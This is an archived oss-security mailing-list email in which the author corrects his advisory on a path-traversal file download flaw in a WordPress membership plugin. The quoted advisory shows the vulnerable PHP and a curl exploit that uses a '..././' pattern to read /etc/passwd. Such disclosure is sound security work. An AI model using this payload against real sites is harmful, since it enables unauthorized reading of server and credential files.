X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2912" "Wednesday" "15" "March" "2017" "08:09:01" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<68EF56AF-248C-4D01-A1E5-DC0AB9FCACBB@me.com>" "70" "Re: [oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58" nil nil nil "3" "2017031512:09:01" "[oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58" (number mark "U       larry0@me.co Mar 15   70/2912  " thread-indent "\"Re: [oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58\"\n") "<59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>" ("<59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 23712 invoked by uid 550); 15 Mar 2017 12:09:16 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 23688 invoked from network); 15 Mar 2017 12:09:16 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1489579744; bh=/DrA9KFURibkUitcEU1xST3eAU/j9kx8hP11IekeM8Y=;
	h=Content-type:MIME-version:Subject:From:Date:Message-id:To;
	b=c6jWmFMiHFWxHdMztz7WUUZUcKZWaSu2fSHTWCWEonyapl9lPtEN4CsyMSfCnzL1R
 GmvMshw39BgxXzsWaZFS4gkoX4wunFnPmBkVYCMJkDUGycXfr7Q0CrkfugKSxk5Dri
 /wev2YrTLTaq0ySyvuW++hfsMZkP4XNXB6/4bD+u/0JVTxecRQm4z5ENKUf50WkP1C
 btu19K2r09g1QtXhw06YGG61M7ffiji3ijnut0piZXPreJ3w4Ms8jm97sbmD0mCIP0
 hSUtl6yry+oK1LrCvwOKfnLEkv/tsdeFlR55v7srFzuDskHrMUcNcmvomfaAd2fkzE
 gUIiVVUrNPfUg==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-03-15_03:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1703150095
Content-type: text/plain; charset=utf-8
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
From: "Larry W. Cashdollar" <larry0@me.com>
In-reply-to: <59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>
Date: Wed, 15 Mar 2017 08:09:01 -0400
Content-transfer-encoding: quoted-printable
Message-id: <68EF56AF-248C-4D01-A1E5-DC0AB9FCACBB@me.com>
References: <59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>
To: oss-security@lists.openwall.com
X-Mailer: Apple Mail (2.3124)
Subject: Re: [oss-security] Arbitrary file download vulnerability in Wordpress
 Plugin Membership Simplified v1.58

Sorry Folks,

The vulnerability description should have read 'does *not* check':

> Vulnerability:
> The file download code located membership-simplified-for-oap-members-only=
/download.php does not check whether a user is logged in and has download p=
rivledges, the code on line 5 that checks the path can be defeated by using=
 a ..././ pattern to get the desired ../ after being passed through the str=
_replace() function:



> On Mar 14, 2017, at 4:33 PM, Larry W. Cashdollar <larry0@me.com> wrote:
>=20
> Title: Arbitrary file download vulnerability in Wordpress Plugin Membersh=
ip Simplified v1.58
> Author: Larry W. Cashdollar, @_larry0
> Date: 2017-03-13
> CVE-ID:[CVE-2017-1002008]
> Download Site: https://wordpress.org/plugins/membership-simplified-for-oa=
p-members-only
> Vendor: https://profiles.wordpress.org/williamdeangelis/
> Vendor Notified: 2017-03-13
> Vendor Contact: plugins@wordpress.org
> Advisory: http://www.vapidlabs.com/advisory.php?v=3D187
> Description: Membership Simplified allows you to generate membership less=
ons with templated content to create a unified look and feel throughout you=
r courses.
> Vulnerability:
> The file download code located membership-simplified-for-oap-members-only=
/download.php does check whether a user is logged in and has download privl=
edges, the code on line 5 that checks the path can be defeated by using a .=
.././ pattern to get the desired ../ after being passed through the str_rep=
lace() function:
>=20
> 3 $path =3D substr(getcwd(), 0, -50). "uploads/membership-simplified-for-=
oap-members-only/"; // change the path to fit your websites document struct=
ure
>  4 $fullPath =3D $path.$_GET['download_file'];
>  5 $fullPath =3D str_replace("../","",$fullPath);
>  6=20
>  7 if ($fd =3D fopen($fullPath, "r")) {
>  8     $fsize =3D filesize($fullPath);
>  9     $path_parts =3D pathinfo($fullPath);
> 10     $ext =3D strtolower($path_parts["extension"]);
> 11     switch ($ext) {
> 12         case "pdf":
> 13         header("Content-type: application/pdf"); // add here more head=
ers for d    iff. extensions
> 14         header("Content-Disposition: attachment; filename=3D\"".$path_=
parts["base    name"]."\""); // use 'attachment' to force a download
> 15         break;
> 16         default;
> 17         header("Content-type: application/octet-stream");
> 18         header("Content-Disposition: filename=3D\"".$path_parts["basen=
ame"]."\"")    ;
> 19     }
> 20     header("Content-length: $fsize");
> 21     header("Cache-control: private"); //use this to open files directly
> 22     while(!feof($fd)) {
> 23         $buffer =3D fread($fd, 2048);
> 24         echo $buffer;
>=20
> Exploit Code:
> 	=E2=80=A2 $ curl http://example.com/wordpress/wp-content/plugins/members=
hip-simplified-for-oap-members-only/download.php?download_file=3D..././.../=
./..././..././..././..././..././..././etc/passwd
> 	=E2=80=A2=20=20

